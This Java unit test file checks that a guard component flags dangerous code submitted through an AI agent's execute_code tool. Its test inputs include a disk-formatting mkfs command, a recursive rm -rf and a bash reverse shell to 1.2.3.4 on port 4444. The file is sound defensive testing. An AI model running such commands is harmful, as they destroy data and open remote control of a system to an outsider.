package vip.mate.tool.guard.guardian;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import vip.mate.tool.guard.engine.ToolGuardRuleRegistry;
import vip.mate.tool.guard.model.GuardCategory;
import vip.mate.tool.guard.model.GuardFinding;
import vip.mate.tool.guard.model.GuardSeverity;
import vip.mate.tool.guard.model.ToolInvocationContext;

import java.util.List;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * Verifies that the live guard path ({@link ShellCommandGuardian}) screens the
 * {@code execute_code} tool against the same dangerous-pattern ruleset as direct
 * shell execution. With no DB rules for the tool, the guardian falls back to its
 * built-in rules, so LLM-authored code containing destructive commands is caught.
 */
class ShellCommandGuardianCodeTest {

    private ShellCommandGuardian newGuardian() {
        ToolGuardRuleRegistry registry = mock(ToolGuardRuleRegistry.class);
        // No DB rules → guardian owns the invocation and uses built-in rules.
        when(registry.getRulesForTool("execute_code")).thenReturn(List.of());
        when(registry.getCompiledPattern(org.mockito.ArgumentMatchers.anyString()))
                .thenAnswer(inv -> Pattern.compile(inv.getArgument(0), Pattern.CASE_INSENSITIVE));
        return new ShellCommandGuardian(registry);
    }

    @Test
    @DisplayName("supports execute_code as a shell-equivalent tool")
    void supportsExecuteCode() {
        ShellCommandGuardian guardian = newGuardian();
        ToolInvocationContext ctx = ToolInvocationContext.of(
                "execute_code", "{\"code\":\"print(1)\"}", "conv-1", "agent-1");
        assertThat(guardian.supports(ctx)).isTrue();
    }

    @Test
    @DisplayName("flags a destructive mkfs command inside execute_code as CRITICAL")
    void flagsDestructiveCode() {
        ShellCommandGuardian guardian = newGuardian();
        ToolInvocationContext ctx = ToolInvocationContext.of(
                "execute_code", "{\"language\":\"bash\",\"code\":\"mkfs.ext4 /dev/sda1\"}", "conv-1", "agent-1");
        List<GuardFinding> findings = guardian.evaluate(ctx);
        assertThat(findings).isNotEmpty();
        assertThat(findings).anyMatch(f -> f.severity() == GuardSeverity.CRITICAL
                && f.category() == GuardCategory.COMMAND_INJECTION);
    }

    @Test
    @DisplayName("gates a high-risk rm -rf inside execute_code")
    void gatesRecursiveDelete() {
        ShellCommandGuardian guardian = newGuardian();
        ToolInvocationContext ctx = ToolInvocationContext.of(
                "execute_code", "{\"language\":\"bash\",\"code\":\"rm -rf /tmp/data\"}", "conv-1", "agent-1");
        assertThat(guardian.evaluate(ctx)).isNotEmpty();
    }

    @Test
    @DisplayName("flags a reverse-shell payload inside execute_code")
    void flagsReverseShell() {
        ShellCommandGuardian guardian = newGuardian();
        ToolInvocationContext ctx = ToolInvocationContext.of(
                "execute_code", "{\"language\":\"bash\",\"code\":\"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\"}",
                "conv-1", "agent-1");
        assertThat(guardian.evaluate(ctx)).isNotEmpty();
    }

    @Test
    @DisplayName("benign code produces no findings")
    void benignCodeClean() {
        ShellCommandGuardian guardian = newGuardian();
        ToolInvocationContext ctx = ToolInvocationContext.of(
                "execute_code", "{\"language\":\"python\",\"code\":\"print(sum(range(10)))\"}",
                "conv-1", "agent-1");
        assertThat(guardian.evaluate(ctx)).isEmpty();
    }
}
